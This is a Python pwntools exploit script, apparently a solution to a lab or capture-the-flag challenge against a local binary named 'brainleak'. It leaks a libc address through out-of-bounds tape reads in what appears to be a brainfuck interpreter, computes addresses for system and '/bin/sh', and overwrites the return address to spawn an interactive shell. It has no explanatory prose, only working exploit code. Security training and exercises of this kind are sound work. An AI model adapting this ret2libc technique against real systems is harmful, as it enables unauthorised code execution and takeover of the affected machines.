from pwn import *

p = process(['/home/lab07/brainleak/target'], env={})

LIBC = ELF("/lib/i386-linux-gnu/libc.so.6")
offset_system = 0x48170
offset_binsh = 0x1bd0d5

offset = 0x420
payload = b">" * offset
payload += b".>.>.>.<<<"

p.recvline()
p.sendline(payload)
libc_start_call_main_121 = u32(p.recv(4))
libc_start_call_main = libc_start_call_main_121 - 121

####################
offset_libc_start_call_main = 0x214a0 
addr_libc_base = libc_start_call_main - offset_libc_start_call_main
addr_system = addr_libc_base + offset_system
addr_binsh = addr_libc_base + offset_binsh

system = p32(addr_system)
binsh = p32(addr_binsh)
deadbeef = p32(0xdeadbeef)

print( hex(addr_libc_base ))

payload = b""
for i in range(4):
    payload += b"," + system[i].to_bytes(1, "little") + b"\n>"
    if (i == 3):
        payload += b">>>>"
    
for i in range(4):
    payload += b"," + binsh[i].to_bytes(1, "little") + b"\n>"

p.sendline(payload)
p.interactive()

""" assert main address
payload = b">" * offset
payload += b">." * 4

p.sendline(payload)
ret_main_value = u32(p.recv(8))

print( hex(ret_main_value ))

p.interactive()
"""

# 0xf7d9f519